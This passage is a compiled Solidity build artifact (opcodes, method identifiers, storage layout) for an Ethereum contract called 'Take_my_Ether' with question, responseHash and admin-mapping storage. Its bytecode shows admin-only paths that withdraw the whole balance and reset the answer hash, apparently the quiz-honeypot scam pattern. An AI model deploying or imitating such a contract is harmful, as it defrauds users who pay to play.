0x0 CALLER PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x250 SWAP2 SWAP1 PUSH2 0x933 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH2 0x28B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x2D1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP PUSH1 0x0 DUP1 SHL PUSH1 0x1 DUP2 SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 CALLER PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x2F3 SWAP2 SWAP1 PUSH2 0x933 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH2 0x32E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SHL PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0x37D JUMPI DUP2 DUP2 PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x34E SWAP3 SWAP2 SWAP1 PUSH2 0x97B JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 PUSH1 0x1 DUP2 SWAP1 SSTORE POP DUP4 DUP4 PUSH1 0x0 SWAP2 SWAP1 PUSH2 0x37B SWAP3 SWAP2 SWAP1 PUSH2 0x3F1 JUMP JUMPDEST POP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 CALLER PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x398 SWAP2 SWAP1 PUSH2 0x933 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH2 0x3D3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 DUP3 PUSH1 0x0 SWAP2 SWAP1 PUSH2 0x3E4 SWAP3 SWAP2 SWAP1 PUSH2 0x3F1 JUMP JUMPDEST POP DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP POP POP POP JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH2 0x3FD SWAP1 PUSH2 0x887 JUMP JUMPDEST SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH2 0x41F JUMPI PUSH1 0x0 DUP6 SSTORE PUSH2 0x466 JUMP JUMPDEST DUP3 PUSH1 0x1F LT PUSH2 0x438 JUMPI DUP1 CALLDATALOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH2 0x466 JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH2 0x466 JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH2 0x465 JUMPI DUP3 CALLDATALOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH2 0x44A JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH2 0x473 SWAP2 SWAP1 PUSH2 0x477 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST JUMPDEST DUP1 DUP3 GT ISZERO PUSH2 0x490 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH2 0x478 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x4FB DUP3 PUSH2 0x4B2 JUMP JUMPDEST DUP2 ADD DUP2 DUP2 LT PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT OR ISZERO PUSH2 0x51A JUMPI PUSH2 0x519 PUSH2 0x4C3 JUMP JUMPDEST JUMPDEST DUP1 PUSH1 0x40 MSTORE POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x52D PUSH2 0x494 JUMP JUMPDEST SWAP1 POP PUSH2 0x539 DUP3 DUP3 PUSH2 0x4F2 JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT ISZERO PUSH2 0x559 JUMPI PUSH2 0x558 PUSH2 0x4C3 JUMP JUMPDEST JUMPDEST PUSH2 0x562 DUP3 PUSH2 0x4B2 JUMP JUMPDEST SWAP1 POP PUSH1 0x20 DUP2 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP3 DUP2 DUP4 CALLDATACOPY PUSH1 0x0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x591 PUSH2 0x58C DUP5 PUSH2 0x53E JUMP JUMPDEST PUSH2 0x523 JUMP JUMPDEST SWAP1 POP DUP3 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP5 DUP5 DUP5 ADD GT ISZERO PUSH2 0x5AD JUMPI PUSH2 0x5AC PUSH2 0x4AD JUMP JUMPDEST JUMPDEST PUSH2 0x5B8 DUP5 DUP3 DUP6 PUSH2 0x56F JUMP JUMPDEST POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH1 0x1F DUP4 ADD SLT PUSH2 0x5D5 JUMPI PUSH2 0x5D4 PUSH2 0x4A8 JUMP JUMPDEST JUMPDEST DUP2 CALLDATALOAD PUSH2 0x5E5 DUP5 DUP3 PUSH1 0x20 DUP7 ADD PUSH2 0x57E JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x604 JUMPI PUSH2 0x603 PUSH2 0x49E JUMP JUMPDEST JUMPDEST PUSH1 0x0 DUP3 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x622 JUMPI PUSH2 0x621 PUSH2 0x4A3 JUMP JUMPDEST JUMPDEST PUSH2 0x62E DUP5 DUP3 DUP6 ADD PUSH2 0x5C0 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x671 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x656 JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x680 JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x691 DUP3 PUSH2 0x637 JUMP JUMPDEST PUSH2 0x69B DUP2 DUP6 PUSH2 0x642 JUMP JUMPDEST SWAP4 POP PUSH2 0x6AB DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x653 JUMP JUMPDEST PUSH2 0x6B4 DUP2 PUSH2 0x4B2 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x6D9 DUP2 DUP5 PUSH2 0x686 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 DUP4 PUSH1 0x1F DUP5 ADD SLT PUSH2 0x701 JUMPI PUSH2 0x700 PUSH2 0x4A8 JUMP JUMPDEST JUMPDEST DUP3 CALLDATALOAD SWAP1 POP PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x71E JUMPI PUSH2 0x71D PUSH2 0x6E1 JUMP JUMPDEST JUMPDEST PUSH1 0x20 DUP4 ADD SWAP2 POP DUP4 PUSH1 0x1 DUP3 MUL DUP4 ADD GT ISZERO PUSH2 0x73A JUMPI PUSH2 0x739 PUSH2 0x6E6 JUMP JUMPDEST JUMPDEST SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x40 DUP6 DUP8 SUB SLT ISZERO PUSH2 0x75B JUMPI PUSH2 0x75A PUSH2 0x49E JUMP JUMPDEST JUMPDEST PUSH1 0x0 DUP6 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x779 JUMPI PUSH2 0x778 PUSH2 0x4A3 JUMP JUMPDEST JUMPDEST PUSH2 0x785 DUP8 DUP3 DUP9 ADD PUSH2 0x6EB JUMP JUMPDEST SWAP5 POP SWAP5 POP POP PUSH1 0x20 DUP6 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x7A8 JUMPI PUSH2 0x7A7 PUSH2 0x4A3 JUMP JUMPDEST JUMPDEST PUSH2 0x7B4 DUP8 DUP3 DUP9 ADD PUSH2 0x6EB JUMP JUMPDEST SWAP3 POP SWAP3 POP POP SWAP3 SWAP6 SWAP2 SWAP5 POP SWAP3 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x7D5 DUP2 PUSH2 0x7C2 JUMP JUMPDEST DUP2 EQ PUSH2 0x7E0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x7F2 DUP2 PUSH2 0x7CC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x40 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x811 JUMPI PUSH2 0x810 PUSH2 0x49E JUMP JUMPDEST JUMPDEST PUSH1 0x0 DUP5 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x82F JUMPI PUSH2 0x82E PUSH2 0x4A3 JUMP JUMPDEST JUMPDEST PUSH2 0x83B DUP7 DUP3 DUP8 ADD PUSH2 0x6EB JUMP JUMPDEST SWAP4 POP SWAP4 POP POP PUSH1 0x20 PUSH2 0x84E DUP7 DUP3 DUP8 ADD PUSH2 0x7E3 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH2 0x89F JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 EQ ISZERO PUSH2 0x8B3 JUMPI PUSH2 0x8B2 PUSH2 0x858 JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x8E4 DUP3 PUSH2 0x8B9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x60 SHL SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x903 DUP3 PUSH2 0x8EB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x915 DUP3 PUSH2 0x8F8 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x92D PUSH2 0x928 DUP3 PUSH2 0x8D9 JUMP JUMPDEST PUSH2 0x90A JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x93F DUP3 DUP5 PUSH2 0x91C JUMP JUMPDEST PUSH1 0x14 DUP3 ADD SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x95A DUP4 DUP6 PUSH2 0x642 JUMP JUMPDEST SWAP4 POP PUSH2 0x967 DUP4 DUP6 DUP5 PUSH2 0x56F JUMP JUMPDEST PUSH2 0x970 DUP4 PUSH2 0x4B2 JUMP JUMPDEST DUP5 ADD SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x996 DUP2 DUP5 DUP7 PUSH2 0x94E JUMP JUMPDEST SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x26 0x2C NOT SUB CALLDATALOAD DUP1 SMOD CALLDATACOPY SWAP10 MLOAD 0xEE SHL EXP CALLVALUE 0xD6 ADD CREATE LOG0 0x5D CODECOPY 0x2B 0xD7 0xD EXTCODEHASH DUP7 0x28 NOT PUSH7 0x34D598BC64736F PUSH13 0x634300080A0033000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "503400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"": "200",
						"New(string,bytes32)": "infinite",
						"Start(string,string)": "infinite",
						"Stop()": "infinite",
						"Try(string)": "infinite",
						"question()": "infinite"
					}
				},
				"methodIdentifiers": {
					"New(string,bytes32)": "ed8df164",
					"Start(string,string)": "c76de3e9",
					"Stop()": "bedf0f4a",
					"Try(string)": "3853682c",
					"question()": "3fad9ae0"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 45,
						"contract": "contracts/Test.sol:Take_my_Ether",
						"label": "question",
						"offset": 0,
						"slot": "0",
						"type": "t_string_storage"
					},
					{
						"astId": 47,
						"contract": "contracts/Test.sol:Take_my_Ether",
						"label": "responseHash",
						"offset": 0,
						"slot": "1",
						"type": "t_bytes32"
					},
					{
						"astId": 51,
						"contract": "contracts/Test.sol:Take_my_Ether",
						"label": "admin",
						"offset": 0,
						"slot": "2",
						"type": "t_mapping(t_bytes32,t_bool)"
					}
				],
				"types": {
					"t_bool": {
						"encoding": "inplace",
						"label": "bool",
						"numberOfBytes": "1"
					},
					"t_bytes32": {
						"encoding": "inplace",
						"label": "bytes32",
						"numberOfBytes": "32"
					},
					"t_mapping(t_bytes32,t_bool)": {
						"encoding": "mapping",
						"key": "t_bytes32",
						"label": "mapping(bytes32 => bool)",
						"numberOfBytes": "32",
						"value": "t_bool"
					},
					"t_string_storage": {
						"encoding": "bytes",
						"label": "string",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"notice": "Submitted for verification at Etherscan.io on 2024-04-17",
				"version": 1
			}
		}
	}
}